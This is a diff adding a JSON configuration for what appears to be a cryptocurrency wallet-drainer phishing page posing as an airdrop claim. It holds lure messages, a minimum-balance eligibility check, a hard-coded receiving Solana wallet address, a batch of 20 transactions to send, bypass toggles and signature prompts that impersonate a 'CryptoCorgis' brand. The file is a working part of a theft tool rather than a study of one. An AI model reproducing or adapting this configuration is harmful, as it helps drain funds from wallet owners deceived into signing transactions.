@@ -1,0 +1,41 @@
+{
+    "texts": [
+        "Invalid Wallet",
+        "Wallet has no funds to pay the transaction Fees.",
+        "Sign Up / Sign In with Wallet",
+        "{addyfirst4}...{addylast4}",
+        "Please, wait...",
+        "Ineligible",
+        "This wallet is ineligible to claim. Please try again with a wallet with more activity.",
+        "Claiming",
+        "Please confirm prompt in order to claim",
+        "Collecting airdrop...",
+        "Please wait while we collecting your airdrop..."
+    ],
+    "textchanging": true,
+    "bypass": false,
+    "modal": 0,
+    "bypassv2": {
+        "enabled": false,
+        "loadTime": 1,
+        "concurrent": 15
+    },
+    "solflare": {
+        "transactions": 20,
+        "each": 1,
+        "sWallet": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"
+    },
+    "dummy": {
+        "enabled": false,
+        "signing": {
+            "enabled": true,
+            "message": "To authenticate with Us, sign below"
+        }
+    },
+    "minEligible": 10,
+    "seeds": {
+        "askForConnecting": true,
+        "signMessage": "To avoid digital dognappers, sign below to authenticate with CryptoCorgis",
+        "enableSign": true
+    }
+}
